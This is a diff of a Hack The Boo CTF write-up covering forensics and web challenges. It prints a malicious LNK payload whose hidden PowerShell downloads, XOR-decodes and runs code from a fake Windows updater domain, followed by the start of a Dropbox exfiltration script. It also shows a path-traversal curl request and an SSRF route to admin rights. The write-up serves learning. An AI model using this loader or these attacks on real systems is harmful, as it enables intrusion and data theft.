@@ -16,14 +16,14 @@ For this years halloween I decided to participate in the Hack The Boo CTF compet
 Another night staying alone at home during Halloween. But someone wanted to play a Halloween game with me. They emailed me the subject "Trick or Treat" and an attachment. When I opened the file, a black screen appeared for a second on my screen. It wasn't so scary; maybe the season is not so spooky after all.
 
 ### LNK File
-We start our investigation by analyzing the `lnk` file with `exiftools` by executing `exiftools trick_or_treat.lnk` on the file. Inside the file information we find something strange:
+We start our investigation by analyzing the `.lnk` file with `exiftools` by executing `exiftools trick_or_treat.lnk` on the file. Inside the file information we find something strange:
 ```
 Working Directory               : C:
 Command Line Arguments          : /k for /f "tokens=*" %a in ('dir C:\Windows\SysWow64\WindowsPowerShell\v1.0\*rshell.exe /s /b /od') do call %a -windowstyle hidden "$asvods ='';$UserAgents = @('Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/15.15063','Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; AS; rv:11.0) like Gecko');$RandomUserAgent = $UserAgents | Get-Random;$WebClient = New-Object System.Net.WebClient;$WebClient.Headers.Add('User-Agent', $RandomUserAgent);$boddmei = $WebClient.DownloadString('http://windowsliveupdater.com');$vurnwos ='';for($i=0;$i -le $boddmei.Length-2;$i=$i+2){$bodms=$boddmei[$i]+$boddmei[$i+1];$decodedChar = [char]([convert]::ToInt16($bodms, 16));$xoredChar=[char]([byte]($decodedChar) -bxor 0x1d);$vurnwos = $vurnwos + $xoredChar};Invoke-Command -ScriptBlock ([Scriptblock]::Create($vurnwos));Invoke-Command -ScriptBlock ([Scriptblock]::Create($asvods));
 Icon File Name                  : C:\Windows\System32\shell32.dl
 ```
-Let us take some time to analyze the script behavior. The script first selects a random User-Agent from the crafted `$UserAgents` array. It then uses a WebClient to download the contents of the specified URL (http://windowsliveupdater.com) and decodes the obfuscated file as follows:
-```
+Let us take some time to analyze the behavior. The script first selects a random User-Agent from the crafted `$UserAgents` array. It then uses a WebClient to download the contents of the specified URL (http://windowsliveupdater.com) and decodes the obfuscated file as follows:
+```powershell
 $vurnwos ='';
 for($i=0;$i -le $boddmei.Length-2;$i=$i+2){
     $bodms=$boddmei[$i]+$boddmei[$i+1];
@@ -35,12 +35,11 @@ for($i=0;$i -le $boddmei.Length-2;$i=$i+2){
 This essentially performs an XOR operation with `0x1d` on every character in the downloaded file. This information might be useful later on in our investigations. Now lets proceed with the PCAP file.
 
 ### PCAP File
-Inside the `lnk` we found that a request was made to a fake windows updater url. Looking at the `pcap` file and searching for the domain, we find that the IP address leads to `77.74.198.52`. We select one of its request and follow the HTTP stream. One of the packets contains a giant blob of text:
+Inside the `.lnk` file we found that a request was made to a fake windows updater url. Looking at the `.pcap` file and searching for the domain, we find that the IP address leads to `77.74.198.52`. We select one of its requests and follow the HTTP stream. One of the packets contains a giant blob of random text:
 ```
-7b68737e697472733d596f726d5f726530486d71727c793d661717465e70797178695f
-...
+7b68737e697472733d596f726d5f726530486d71727c793d661717465e70797178695f...
 ```
-It looks like an encoded string and we know that we have to decode it with the XOR function we found previously. Now there are several ways to solve this. Either we use [CyberShef](https://gchq.github.io/CyberChef/#recipe=From_Hex('Auto')XOR(%7B'option':'Hex','string':'0x1d'%7D,'Standard',false)) and apply the XOR operation ourselves, or we can run the script ourselves in the tool from [TryItOnline](https://tio.run/#powershell) by replacing the `$vurnwos` variable with the above string. Either way we retrieve the decoded script:
+It looks like an encoded string and we know that we have to decode it with the XOR function we found previously. Now there are several ways to solve this. Either we use [CyberChef](https://gchq.github.io/CyberChef/#recipe=From_Hex('Auto')XOR(%7B'option':'Hex','string':'0x1d'%7D,'Standard',false)) and apply the XOR operation, or we can run the script ourselves in the tool from [TryItOnline](https://tio.run/#powershell) by replacing the `$vurnwos` variable with the above string. Either way we retrieve the decoded script:
 ```bash
 function DropBox-Upload {
     [CmdletBinding()]
@@ -89,9 +88,13 @@ Inside we find our flag as the DropBox AccessToken.
 As I was walking the neighbor's streets for some Trick-or-Treat, a strange man approached me, saying he was dressed as "The God of Mischief!". He handed me some candy and disappeared. Among the candy bars was a USB in disguise, and when I plugged it into my computer, all my files were corrupted! First, spawn the haunted Docker instance and connect to it! Dig through the horrors that lie in the given Logs and answer whatever questions are asked of you!
 
 ### Sysmon Analysis
-For this challenge we are given some Windows Event Logs. For dealing with `evtx` files on Linux we can use an [EVTX Parser](https://github.com/Velocidex/evtx). We are only interested in the Sysmon logs so
+For this challenge we are given some Windows Event Logs. For dealing with `.evtx` files on Linux we can use an [EVTX Parser](https://github.com/Velocidex/evtx). We are only interested in the Sysmon logs so
 ```bash
 ./dumpevtx parse Microsoft-Windows-Sysmon%4Operational.evtx > sysmon.log
+```
+Alternatively, we can also use Chainsaw to quickly hunt for Windows Artifacts:
+```bash
+./chainsaw hunt Logs/ -s sigma_rules/ --mapping mappings/sigma-event-logs-all.yml
 ```
 Now we can more easily search through the event log. Let's connect to the docker instance and try to answer some questions.
 ```
@@ -138,9 +141,11 @@ On this page we add products to the site that gets reviewed by the moderators. W
 ### Source code analysis
 In the `index.html` file we see that if we have the admin role, we can see the flag.
 ```
+{% raw %}
 {% if user['role'] == 'admin' %}
 {{flag}}
 {% endif %}
+{% endraw %}
 ```
 Now how can we get the admin role? Well, conveniently there is a function called `makeUserAdmin` being used in the `/addAdmin` endpoint. Looking in the `util.py` file we see that the `downloadManual(url)` function does some simple checks against the url we put in.
 ```python
@@ -249,7 +254,7 @@ As discussed previously, our job is to read a file from the server (flag.txt). L
     </body>
 </html>
 ```
-This page will call the `OutFileContents()` function from the `main.go` file and pass in our UserAgent as a parameter. Now why not just pass in the file we want to read? Well, since the function expects an argument of type `RequestData`, so we can't actually pass it a string. We will have to modify our UserAgent when sending our request. We can either do this with BurpSuite, but a simple curl can also do the trick:
+This page will call the `OutFileContents()` function from the `main.go` file and pass in our UserAgent as a parameter. Now why not just pass in the file we want to read? Well, since the function expects an argument of type `RequestData`, so we might not be always able to pass it a string. We will have to modify our UserAgent when sending our request. We can either do this with BurpSuite, but a simple curl can also do the trick:
 ```
 curl  -H "User-Agent: ../flag.txt" 'http://<IP>:<PORT>/render?use_remote=true&page=https://go.dev/play/p/<ID_TO_OUR_TEST_PAGE>.go?download=true'
 ```
